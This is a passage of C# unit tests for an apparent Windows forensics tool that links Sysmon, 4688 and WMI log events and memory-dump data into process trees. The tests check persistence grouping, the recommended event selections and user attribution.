            Ev4688("2024-03-01 10:00:00", "SYSTEM", @"C:\Windows\System32\wbem\WmiPrvSE.exe", @"C:\x.exe", "800", "4") +
            Ev4688("2024-03-01 10:00:01", "alice", @"C:\Windows\System32\wscript.exe", @"C:\x.exe", "810", "4") +
            Row("2024-03-01 10:00:05", 5857, Wmi, "", "", new[] { "PID: 800", @"Path: C:\Windows\System32\wbem\cimwin32.dll" }, rowPid: "1200") +
            Row("2024-03-01 10:00:06", 5860, Wmi, "", "", new[] { "Query: SELECT * FROM __InstanceModificationEvent", "PID: 810", "Client machine: PC1", @"User: PC1\alice" }, rowPid: "1200"));
        var ev = g.Evidence.Events;
        var prov = ev.LinksFor(g.AllNodes.Single(x => x.Pid == 800), ProcessEventGroup.Persistence).Single().Event;
        prov.EventId.Should().Be(5857);
        prov.T1.Should().EndWith("cimwin32.dll");
        var sub = ev.LinksFor(g.AllNodes.Single(x => x.Pid == 810), ProcessEventGroup.Persistence).Single().Event;
        sub.EventId.Should().Be(5860);
        sub.T1.Should().Contain("__InstanceModificationEvent");
        sub.User.Should().Be(@"PC1\alice");
    }

    // ---- compatibility ------------------------------------------------------------------------------------------------------------------------------

    [Fact]
    public void ProcessFacet_StaysLimitedToCreateAndExit_WhileEventsAllShowsEverything()
    {
        var g = Build(StartA() +
            Row("2024-03-01 09:01:00", 3, Sys, @"PC1\bob", AExe, new[] { PidTag("100", GA), "RuleName: -", "SourceHostname: PC1", "SourceIp: 10.0.0.5", "DestinationHostname: h", "DestinationIp: 1.2.3.4" }) +
            Row("2024-03-01 09:02:00", 12, Sys, @"PC1\bob", "", new[] { PidTag("100", GA), "", "Image: " + AExe, "EventType: CreateKey", @"TargetObject: HKU\x" }));
        var a = ByGuid(g, GA);
        g.Evidence.Get(ProcessFacetKind.EvtProcess, a).Rows.Should().OnlyContain(r => r[2] == "Process created");
        g.Evidence.Get(ProcessFacetKind.EvtAll, a).TotalRows.Should().Be(3);
        g.Evidence.Events.GroupCounts(a).Should().Contain(new KeyValuePair<ProcessEventGroup, int>(ProcessEventGroup.Registry, 1));
        g.Evidence.Events.For(a).Should().HaveCount(3);
    }

    // ---- recommended events -------------------------------------------------------------------------------------------------------------------------

    [Fact]
    public void RecommendedEvents_ProcessActivityGroup_HasDefaultsAndNotes_AndNoDuplicates()
    {
        var s = EvtxSelection.Recommended();
        var group = s.Groups.Single(x => x.Id == "process-activity");
        group.Title.Should().Be("Process activity (process tree details)");
        group.Events.Where(e => e.Default && e.Channel.Contains("Sysmon")).Select(e => e.EventId).Should().BeEquivalentTo(new[] { 2, 6, 7, 12, 14, 15, 17, 18, 22, 23, 25, 26 });
        group.Events.Where(e => e.Channel == "Windows PowerShell").Select(e => e.EventId).Should().BeEquivalentTo(new[] { 400, 800 });
        group.Events.Where(e => e.Channel.Contains("AppLocker")).Select(e => e.EventId).Should().BeEquivalentTo(new[] { 8002, 8003, 8004, 8005, 8006, 8007 });
        group.Events.Where(e => e.Channel.Contains("TaskScheduler")).Select(e => e.EventId).Should().BeEquivalentTo(new[] { 129, 201 });
        group.Events.Single(e => e.EventId == 5857).Default.Should().BeTrue();
        var off = group.Events.Where(e => !e.Default).ToList();
        off.Select(e => e.EventId).Should().BeEquivalentTo(new[] { 5156, 5158, 4656, 4663, 4657 });
        off.Should().OnlyContain(e => e.Note.Length > 0);
        group.Events.Should().OnlyContain(e => e.MapStatus == "verified" || e.MapStatus == "no-map");
        group.Events.Where(e => e.MapStatus == "no-map").Select(e => e.EventId).Should().BeEquivalentTo(new[] { 8003, 8006 });
        s.AllEvents.GroupBy(e => e.Key).Where(k => k.Count() > 1).Should().BeEmpty();
        EvtxSelection.Parse(s.ToJson()).AllEvents.Single(e => e.EventId == 7).Note.Should().Contain("Payload");
    }

    // ---- user from memory never overwrites a log user -----------------------------------------------------------------------------------------------

    [Fact]
    public void GetSids_does_not_overwrite_a_Sysmon_user_but_still_adds_integrity()
    {
        Directory.CreateDirectory(Path.Combine(_host, "Memory"));
        File.WriteAllText(Path.Combine(_host, "Memory", "Memory_PsList.csv"),
            "TreeDepth,PID,PPID,ImageFileName,Offset(V),Threads,Handles,SessionId,Wow64,CreateTime,ExitTime,File output\r\n" +
            "0,100,4,a.exe,0x1,1,1,1,False,2024-03-01 09:00:00.0000000,,Disabled\r\n", new UTF8Encoding(false));
        File.WriteAllText(Path.Combine(_host, "Memory", "Memory_GetSids.csv"),
            "TreeDepth,PID,Process,SID,Name\r\n0,100,a.exe,S-1-5-21-1-2-3-1001,memuser\r\n0,100,a.exe,S-1-16-12288,High Mandatory Level\r\n", new UTF8Encoding(false));
        var g = Build(StartA());
        var a = g.AllNodes.Single(n => n.Pid == 100);
        a.Sources.Should().HaveFlag(ProcessSources.PsList).And.HaveFlag(ProcessSources.Sysmon1);
        a.User.Should().Be(@"PC1\bob");
        a.UserSource.Should().Be("Sysmon 1");
        a.Integrity.Should().Be("High");
    }
}
